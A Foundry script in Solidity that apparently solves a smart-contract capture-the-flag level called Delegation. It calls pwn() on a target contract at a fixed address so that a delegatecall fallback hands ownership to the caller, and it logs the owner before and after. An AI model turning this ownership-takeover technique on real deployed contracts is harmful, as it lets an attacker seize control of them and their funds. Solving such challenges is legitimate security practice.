// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Delegation, Delegate} from "../src/Delegation.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract DelegationSolution is Script {
    Delegation public delegation = Delegation(0xBDEdd9F1F02e55c3d0833824FCC9971EEC6530dC);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Onwer of this daligation contract: ", delegation.owner());
        console.log("My address:", vm.envAddress("MY_ADDRESS"));

        address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("Onwer of this daligation contract leter: ", delegation.owner());
        console.log("My address:", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
